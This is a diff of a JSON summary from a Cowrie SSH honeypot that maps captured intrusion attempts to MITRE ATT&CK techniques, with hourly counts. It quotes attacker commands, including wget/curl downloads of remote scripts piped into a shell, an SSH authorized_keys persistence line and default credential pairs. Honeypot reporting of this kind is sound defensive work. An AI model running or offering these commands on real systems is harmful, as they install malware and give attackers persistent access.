@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-24 05:03:44",
+  "generated": "2026-08-24 06:01:40",
   "totals": {
-    "commands": 104,
-    "login_failed": 251,
-    "login_success": 33,
-    "sessions": 311
+    "commands": 120,
+    "login_failed": 327,
+    "login_success": 38,
+    "sessions": 403
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 251,
+      "count": 327,
       "examples": [
         "root / 123456",
         "root / 12345678",
@@ -21,14 +21,14 @@
         "root / 1q2w3e4r"
       ],
       "first": "2026-08-24T00:00:38.589360Z",
-      "last": "2026-08-24T05:02:16.445616Z",
-      "unique_ips": 31
+      "last": "2026-08-24T05:59:12.415527Z",
+      "unique_ips": 35
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 33,
+      "count": 38,
       "examples": [
         "root / e10adc39",
         "ubuntu / ubuntu",
@@ -37,14 +37,14 @@
         "root / root"
       ],
       "first": "2026-08-24T00:20:02.041462Z",
-      "last": "2026-08-24T04:48:23.902285Z",
-      "unique_ips": 22
+      "last": "2026-08-24T05:52:20.336260Z",
+      "unique_ips": 25
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 16,
+      "count": 18,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -53,8 +53,24 @@
         "cd /tmp || cd /var/tmp || cd /; wget -q -O- http://176.65.139.196/bins/kla.sh | sh"
       ],
       "first": "2026-08-24T00:50:34.498920Z",
-      "last": "2026-08-24T04:48:07.972319Z",
-      "unique_ips": 5
+      "last": "2026-08-24T05:28:23.492937Z",
+      "unique_ips": 6
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 7,
+      "examples": [
+        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
+      ],
+      "first": "2026-08-24T00:50:33.416948Z",
+      "last": "2026-08-24T05:28:22.539078Z",
+      "unique_ips": 6
     },
     {
       "id": "T1082",
@@ -68,22 +84,6 @@
       ],
       "first": "2026-08-24T00:42:00.777388Z",
       "last": "2026-08-24T04:38:55.082307Z",
-      "unique_ips": 5
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 6,
-      "examples": [
-        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
-      ],
-      "first": "2026-08-24T00:50:33.416948Z",
-      "last": "2026-08-24T04:23:03.253694Z",
       "unique_ips": 5
     },
     {
@@ -187,6 +187,10 @@
   ],
   "unmapped": [
     [
+      "shell",
+      10
+    ],
+    [
       "zalee",
       10
     ],
@@ -199,20 +203,20 @@
       10
     ],
     [
-      "shell",
-      7
-    ],
-    [
       "sh",
-      6
+      9
     ],
     [
       "system",
-      5
+      8
     ],
     [
       "enable",
-      4
+      5
+    ],
+    [
+      "/bin/busybox UNSTABLE",
+      3
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -220,6 +224,18 @@
     ],
     [
       "cd /proc && cat self/cmdline",
+      2
+    ],
+    [
+      "ping; sh",
+      2
+    ],
+    [
+      "/bin/busybox STC",
+      2
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
       2
     ],
     [
@@ -232,10 +248,6 @@
     ],
     [
       "rm -f /tmp/bendi.py",
-      1
-    ],
-    [
-      "/bin/busybox UNSTABLE",
       1
     ],
     [
@@ -252,18 +264,6 @@
     ],
     [
       "echo SHELL_TEST",
-      1
-    ],
-    [
-      "/bin/busybox TEST",
-      1
-    ],
-    [
-      "cat /proc",
-      1
-    ],
-    [
-      "./",
       1
     ]
   ]
